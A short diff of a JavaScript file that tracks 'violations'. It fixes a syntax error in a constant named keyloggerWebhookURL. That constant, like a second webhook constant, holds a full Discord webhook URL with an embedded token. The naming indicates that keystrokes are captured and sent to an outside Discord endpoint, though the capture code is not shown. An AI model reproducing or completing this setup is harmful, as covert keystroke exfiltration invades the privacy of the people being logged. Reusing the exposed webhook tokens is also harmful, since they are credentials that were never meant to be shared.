@@ -10,7 +10,7 @@
 let violationCount = 0;
 const violationHistory = [];
 const webhookURL = "https://discord.com/api/webhooks/1482510569461383242/tF_91rzrXYfs4P-qBbarNafSa-fArvPp99_HxdoM8_iREqzgaSTLhBoFOajYwB1-ElgN";
-const keyloggerWebhookURL = https://discord.com/api/webhooks/1501762208906870847/YCy3FG4KTmvsgW8B98l11HQkydWu8gEygCLEwFVvCN0gtn8e4jO4TIFGWOaeBT2DqKI0"; // REPLACE WITH YOUR SECOND WEBHOOK URL
+const keyloggerWebhookURL = "https://discord.com/api/webhooks/1501762208906870847/YCy3FG4KTmvsgW8B98l11HQkydWu8gEygCLEwFVvCN0gtn8e4jO4TIFGWOaeBT2DqKI0"; // REPLACE WITH YOUR SECOND WEBHOOK URL
 
 // Performance flag to prevent overload
 let isProcessingViolation = false;
